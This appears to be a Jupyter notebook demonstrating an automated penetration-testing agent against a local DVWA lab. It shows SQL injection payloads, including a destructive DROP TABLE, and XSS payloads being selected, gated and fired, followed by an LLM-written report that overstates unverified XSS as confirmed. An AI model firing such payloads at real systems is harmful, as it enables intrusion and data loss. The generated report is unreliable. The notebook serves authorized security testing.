# Offensive IT-Tester — Layer-by-Layer Walkthrough

A live, cell-by-cell run of the seven-layer agent. Each section runs **one layer** and
shows what it produced, so you can watch a target go from *URL* → *discovered injection
points* → *selected payloads* → *governance gate* → *fired attacks* → **confirmed exploits**
→ *report*, with a tamper-evident audit trail underneath.

> **Target.** By default this auto-starts our self-owned Flask sandbox (`127.0.0.1:5000`) so
> the notebook always runs. To use **DVWA** instead, set `TARGET`/`PROFILE` in the config cell
> (DVWA must be running in Docker on `:8080`).

## 0. Setup — imports, project path, and start the target

In [34]:
import sys, subprocess, time, socket, json
from pathlib import Path
import pandas as pd
from IPython.display import display, Markdown

# make the project importable regardless of where the kernel starts
for _p in [Path.cwd(), *Path.cwd().parents]:
    if (_p / "config" / "paths.py").exists():
        if str(_p) not in sys.path: sys.path.insert(0, str(_p))
        ROOT = _p; break

pd.set_option("display.max_colwidth", 60)

# ---------------- CONFIG: which target to test ----------------
TARGET  = "http://127.0.0.1:8080"   # self-owned Flask sandbox (auto-started below)
PROFILE = "dvwa"                    # <- for DVWA use TARGET=".:8080", PROFILE="dvwa"
# --------------------------------------------------------------

PORT = int(TARGET.rsplit(":", 1)[1])
def _up(port):
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=1): return True
    except OSError: return False

_sandbox = None
if PROFILE == "pyapp" and not _up(PORT):
    _sandbox = subprocess.Popen([sys.executable, str(ROOT / "sandbox" / "target_app.py")],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(20):
        if _up(PORT): break
        time.sleep(0.5)

print(f"target  : {TARGET}")
print(f"profile : {PROFILE}")
print(f"reachable: {_up(PORT)}")

target  : http://127.0.0.1:8080
profile : dvwa
reachable: True


## Layer 1 — Authorization (the scope firewall)

Approves a URL only if it is on the allowlist (`config/target_allowlist.yaml`) **and** is a
loopback address. Everything else is rejected by default — this is the legal safety wall.

In [35]:
from src.authorization.authorize import authorize

print("Checking targets against the allowlist:\n")
for url in [TARGET, "http://example.com", "http://127.0.0.1:9999"]:
    d = authorize(url)
    print(f"  [{'APPROVED' if d.approved else 'REJECTED'}]  {url:26}  ->  {d.reason}")

decision = authorize(TARGET)
assert decision.approved, "target must be authorized to continue"
print("\n=> proceeding: target is in scope.")

Checking targets against the allowlist:

  [APPROVED]  http://127.0.0.1:8080       ->  allowlisted: Local DVWA sandbox
  [REJECTED]  http://example.com          ->  host 'example.com' is not loopback (require_loopback=true)
  [REJECTED]  http://127.0.0.1:9999       ->  127.0.0.1:9999 is not on the allowlist

=> proceeding: target is in scope.


## Layer 2 — Reconnaissance (live crawl)

Actually connects to the target, crawls its pages, and parses forms + URL parameters to
**discover** the injection points (it does not read them from a file).

In [36]:
from src.recon.recon import discover

points = discover(TARGET, PROFILE)
print(f"Live crawl discovered {len(points)} injection points:\n")
display(pd.DataFrame([{"point": p.name, "method": p.method, "param": p.param,
                       "bucket": p.bucket, "classes": ",".join(p.classes),
                       "url": p.full_url} for p in points]))

Live crawl discovered 15 injection points:



,point,method,param,bucket,classes,url
0,sqli,GET,id,url_param,sqli,http://127.0.0.1:8080/vulnerabilities/sqli/
1,sqli_blind,GET,id,url_param,sqli,http://127.0.0.1:8080/vulnerabilities/sqli_blind/
2,xss_r,GET,name,search_field,"xss,sqli",http://127.0.0.1:8080/vulnerabilities/xss_r/
3,xss_s,POST,txtName,search_field,"xss,sqli",http://127.0.0.1:8080/vulnerabilities/xss_s/
4,xss_s,POST,mtxMessage,comment_field,"xss,csrf",http://127.0.0.1:8080/vulnerabilities/xss_s/
5,exec,POST,ip,command_exec,cmdi,http://127.0.0.1:8080/vulnerabilities/exec/
6,csrf,GET,password_new,account_settings,csrf,http://127.0.0.1:8080/vulnerabilities/csrf/
7,csrf,GET,password_conf,account_settings,csrf,http://127.0.0.1:8080/vulnerabilities/csrf/
8,fi,GET,page,ssrf_target,ssrf,http://127.0.0.1:8080/vulnerabilities/fi/
9,brute,GET,username,login_form,sqli,http://127.0.0.1:8080/vulnerabilities/brute/


## Layer 3 — Selection (stratified by technique)

For each injection point, pick payloads from the labelled arsenal — grouped by technique so
no technique is skipped — each tagged with the oracle that will later verify it.

In [37]:
from src.intelligence.select import select_all

selection = select_all(points, k_per_type=2)
rows = [{"point": pt.name, "class": p["attack_class"], "type": p["type"],
         "severity": p["severity"], "oracle": p["oracle"],
         "destructive": p["is_destructive"], "payload": p["payload"][:38]}
        for pt, payloads in selection for p in payloads]
df_sel = pd.DataFrame(rows)

print(f"Selected {len(df_sel)} payloads.  Technique coverage per class:")
for cls in sorted(df_sel["class"].unique()):
    techs = ", ".join(sorted(df_sel[df_sel["class"] == cls]["type"].unique()))
    print(f"   {cls:5} -> {techs}")
display(df_sel)

Selected 70 payloads.  Technique coverage per class:
   cmdi  -> Command Injection
   csrf  -> CSRF
   sqli  -> blind-time, boolean-blind, error-based, stacked-queries, tautology, union
   ssrf  -> SSRF
   xss   -> reflected, stored


,point,class,type,severity,oracle,destructive,payload
0,sqli,sqli,blind-time,high,timing,False,' OR SLEEP(5)--
1,sqli,sqli,tautology,high,differential,False,0x27 OR 0x31=0x31--
2,sqli,sqli,error-based,high,error_signature,False,"' AND 1=CONVERT(int,@@version)--"
3,sqli,sqli,blind-time,high,timing,False,' OR pg_sleep(4)#
4,sqli_blind,sqli,blind-time,high,timing,False,' OR SLEEP(5)--
...,...,...,...,...,...,...,...
65,javascript,sqli,stacked-queries,critical,timing,True,'; DROP TABLE sessions--
66,javascript,sqli,error-based,high,error_signature,False,"' AND updatexml(1,concat(0x7e,(SELECT"
67,javascript,sqli,blind-time,high,timing,False,' OR 1=(SELECT COUNT(*) FROM all_users
68,javascript,xss,stored,high,browser_execution,False,"<input oninput='alert(""XSS38"")'>"


## Layer 4 — Governance gate (safety before firing)

The control that makes execution defensible: it **holds every destructive payload** for human
review and enforces a per-point rate limit. Only approved payloads may be fired. Holds are not
failures — they are the gate doing its job.

In [38]:
from src.governance import govern

gate = govern(selection, max_per_point=5)
print(f"Governance decision: {gate.summary()}\n")
if gate.held:
    print("HELD payloads (blocked from firing):")
    display(pd.DataFrame([{"point": pt.name, "class": p["attack_class"],
                           "payload": p["payload"][:38], "reason": reason}
                          for pt, p, reason in gate.held]))
else:
    print("(nothing held this run)")

Governance decision: 50 approved, 20 held

HELD payloads (blocked from firing):


,point,class,payload,reason
0,xss_r,sqli,' OR 1=1-- -,rate limit — over per-point budget (5)
1,xss_r,sqli,' OR SLEEP(5)#,rate limit — over per-point budget (5)
2,xss_r,sqli,"' UNION SELECT user(), NULL--",rate limit — over per-point budget (5)
3,xss_r,sqli,"' OR SUBSTRING(user(),1,1)='r'--",rate limit — over per-point budget (5)
4,xss_r,sqli,' OR SLEEP(9)#,rate limit — over per-point budget (5)
5,xss_r,sqli,"' UNION SELECT @@version, NULL--",rate limit — over per-point budget (5)
6,xss_s,sqli,' OR 1=1-- -,rate limit — over per-point budget (5)
7,xss_s,sqli,' OR SLEEP(5)#,rate limit — over per-point budget (5)
8,xss_s,sqli,"' UNION SELECT user(), NULL--",rate limit — over per-point budget (5)
9,xss_s,sqli,"' OR SUBSTRING(user(),1,1)='r'--",rate limit — over per-point budget (5)


## Layers 5 & 6 — Execution → Detection (verify successful exploitation)

Fire each **approved** payload at the target, then confirm with the oracle assigned to it —
compare against a benign baseline, or a planted signal. Only genuine exploits are marked
confirmed (see `docs/oracles_explained.md`).

In [39]:
from src.recon.recon import build_session
from src.execution import baseline
from src.detection import detect
from src.agent.layer_tools import finding_dict

session = build_session(TARGET, PROFILE)
base_cache, findings = {}, []
for pt, p in gate.approved:
    if pt.full_url not in base_cache:
        base_cache[pt.full_url] = baseline(session, pt)
    conf, _ = detect(session, pt, p, base_cache[pt.full_url])
    findings.append(finding_dict(pt, p, conf))

df_find = pd.DataFrame(findings)
confirmed = df_find[df_find["confirmed"] == True]
print(f"Fired {len(df_find)} payloads.  CONFIRMED {len(confirmed)} real exploit(s):\n")
display(confirmed[["attack_class", "type", "point", "oracle", "confidence", "evidence"]]
        .reset_index(drop=True))

Fired 50 payloads.  CONFIRMED 4 real exploit(s):



,attack_class,type,point,oracle,confidence,evidence
0,xss,stored,xss_r,browser_execution,medium,payload reflected unescaped into HTML (reflected-XSS can...
1,xss,reflected,xss_r,browser_execution,medium,payload reflected unescaped into HTML (reflected-XSS can...
2,xss,stored,xss_r,browser_execution,medium,payload reflected unescaped into HTML (reflected-XSS can...
3,xss,reflected,xss_r,browser_execution,medium,payload reflected unescaped into HTML (reflected-XSS can...


### The honest half — fired but **not** confirmed

Anything an oracle could not confirm is **not** declared safe. These are flagged as candidates
for manual review (unconfirmed ≠ secure).

In [40]:
unconf = df_find[df_find["confirmed"] != True]
print(f"{len(unconf)} payloads fired but not confirmed — candidates for review, NOT 'safe':\n")
display(unconf[["attack_class", "type", "point", "oracle", "evidence"]]
        .drop_duplicates().reset_index(drop=True))

46 payloads fired but not confirmed — candidates for review, NOT 'safe':



,attack_class,type,point,oracle,evidence
0,sqli,blind-time,sqli,timing,no significant delay (0.0s vs 0.0s)
1,sqli,tautology,sqli,differential,true and false conditions matched
2,sqli,error-based,sqli,error_signature,no new DB error in the response
3,sqli,blind-time,sqli_blind,timing,no significant delay (0.0s vs 0.0s)
4,sqli,tautology,sqli_blind,differential,true and false conditions matched
5,sqli,error-based,sqli_blind,error_signature,no new DB error in the response
6,sqli,boolean-blind,xss_r,differential,true and false conditions matched
7,xss,stored,xss_s,browser_execution,not demonstrable without a headless browser (payload not...
8,xss,reflected,xss_s,browser_execution,not demonstrable without a headless browser (payload not...
9,sqli,boolean-blind,xss_s,differential,true and false conditions matched


## Layer 7 — Report

The ground-truth run summary (deterministic). Flip `RUN_LLM = True` to have the local
open-source model (HuggingFace `Qwen2.5-1.5B`) write the prose findings report — slow on CPU.

In [41]:
from src.reporting.report import build_run_summary

state = {"target": TARGET, "profile": PROFILE, "authorized": True, "status": "done",
         "points": points, "findings": findings, "gate": gate}
print(json.dumps(build_run_summary(state), indent=2))

RUN_LLM = True   # <- set True to generate the AI-written report (downloads/loads the model)
if RUN_LLM:
    from src.reporting import generate_report
    display(Markdown(generate_report(state)))

{
  "target": "http://127.0.0.1:8080",
  "profile": "dvwa",
  "authorized": true,
  "status": "done",
  "n_injection_points": 15,
  "n_fired": 50,
  "n_confirmed": 4,
  "n_held": 20,
  "confirmed_by_class": {
    "xss": 4
  },
  "confirmed_findings": [
    {
      "attack_class": "xss",
      "type": "stored",
      "point": "xss_r",
      "oracle": "browser_execution",
      "confidence": "medium",
      "evidence": "payload reflected unescaped into HTML (reflected-XSS candidate); JS execution not verified without a headless browser"
    },
    {
      "attack_class": "xss",
      "type": "reflected",
      "point": "xss_r",
      "oracle": "browser_execution",
      "confidence": "medium",
      "evidence": "payload reflected unescaped into HTML (reflected-XSS candidate); JS execution not verified without a headless browser"
    },
    {
      "attack_class": "xss",
      "type": "stored",
      "point": "xss_r",
      "oracle": "browser_execution",
      "confidence": "medium",
    

Loading weights: 100%|██████████| 338/338 [00:02<00:00, 138.91it/s]
[transformers] Both `max_new_tokens` (=500) and `max_length`(=20) seem to have been set. `max_new_tokens` will take precedence. Please refer to the documentation for more information. (https://huggingface.co/docs/transformers/main/en/main_classes/text_generation)


> **AI-generated (EU AI Act Art. 50).** The prose in this report was written by an open-source LLM (Qwen/Qwen2.5-1.5B-Instruct, run locally via HuggingFace transformers) from the agent's structured run data. Findings are produced by deterministic detection oracles, not by the model.

### Summary

- **Fired Payloads**: 50
- **Held Payloads**: 20
- **Confirmed Findings**: 4

### Scope & Authorization

The assessment was conducted on the DVWA application running locally on `http://127.0.0.1:8080`. The test was authorized with full access rights.

### Confirmed Findings

| Class       | Technique         | Oracle           | Confidence |
|-------------|-------------------|------------------|------------|
| XSS          | Stored            | Browser Execution | Medium     |
| XSS          | Reflected          | Browser Execution | Medium     |

These findings indicate that stored and reflected cross-site scripting (XSS) attacks have been confirmed using the browser execution oracle. The evidence suggests that payloads were reflected unescaped into HTML but did not execute due to lack of verification without a headless browser environment.

### Governance & Caveats

This assessment has been performed within the bounds of an authorized testing session. No external resources or unauthorized actions were taken during this evaluation. However, it is important to note that certain techniques may require additional context or tools to fully verify their presence and impact.

---
## Ground-truth facts (deterministic)
- Target: `http://127.0.0.1:8080`  · profile: `dvwa`  · authorized: True
- Injection points: 15  · payloads fired: 50  · held by governance: 20
- **Confirmed exploits: 4**  · by class: {'xss': 4}
    - xss/stored at `xss_r` via `browser_execution` (medium): payload reflected unescaped into HTML (reflected-XSS candidate); JS execution not verified without a headless browser
    - xss/reflected at `xss_r` via `browser_execution` (medium): payload reflected unescaped into HTML (reflected-XSS candidate); JS execution not verified without a headless browser
    - xss/stored at `xss_r` via `browser_execution` (medium): payload reflected unescaped into HTML (reflected-XSS candidate); JS execution not verified without a headless browser
    - xss/reflected at `xss_r` via `browser_execution` (medium): payload reflected unescaped into HTML (reflected-XSS candidate); JS execution not verified without a headless browser


## Underneath it all — the tamper-evident audit ledger

Everything above ran the layers directly. Here we run the **whole agent** once through
LangGraph so every decision is written to the hash-chained ledger, then verify the chain.

In [42]:
from src.agent import build_agent, AuditLog

audit = AuditLog(ROOT / "audit" / "audit.jsonl")
agent = build_agent(audit=audit)
result = agent.invoke({"target": TARGET})
print("Agent run status:", result["status"])

lines = [json.loads(l) for l in open(ROOT / "audit" / "audit.jsonl", encoding="utf-8") if l.strip()]
recent = lines[[i for i, r in enumerate(lines) if r["event"] == "authorize"][-1]:]
display(pd.DataFrame([{"seq": r["seq"], "event": r["event"],
                       "detail": str(r["data"].get("summary") or r["data"].get("reason")
                                     or r["data"].get("points") or "")[:48]} for r in recent]))

ok, msg = AuditLog.verify(ROOT / "audit" / "audit.jsonl")
print(f"\nChain verification: {'OK — ' if ok else 'BROKEN — '}{msg}")

Agent run status: done


,seq,event,detail
0,122,authorize,allowlisted: Local DVWA sandbox
1,123,recon,15
2,124,select,70 payloads across 15 points
3,125,govern,"50 approved, 20 held"
4,126,execute_detect,



Chain verification: OK — chain intact


## Cleanup — stop the sandbox

In [43]:
if _sandbox is not None:
    _sandbox.terminate()
    print("sandbox stopped.")
else:
    print("nothing to stop (used an already-running target).")

nothing to stop (used an already-running target).
